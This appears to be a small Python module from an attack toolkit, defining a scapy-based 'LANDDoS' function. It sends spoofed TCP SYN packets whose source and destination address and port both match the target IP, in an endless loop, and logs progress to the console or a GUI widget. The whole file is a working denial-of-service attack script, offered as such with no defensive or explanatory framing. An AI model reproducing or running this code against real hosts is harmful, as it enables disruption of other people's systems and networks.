import os
from scapy.all import *
from time import sleep

def LANDDoS(ip,quiet,terminal = None):
    packet = IP(src=ip,dst=ip)/TCP(flags='S',sport=134,dport=134)
    if terminal == None:
        print("[+] Sending Packets to "+ip)
    else:
        terminal.configure(text=terminal.cget("text")+'\n[+] Sending Packets to '+ip)
    iter = 0
    while True:
        send(packet,verbose=0)
        if terminal == None:
            print("[+] Sent packet")
            print(packet.show())
            print("[+] Packet number "+str(iter))
        else:
            terminal.configure(text=terminal.cget("text")+'\n[+] Sent packet\n'+packet.show()+'\n[+] Packet number '+str(iter))
        sleep(2)
        iter += 1
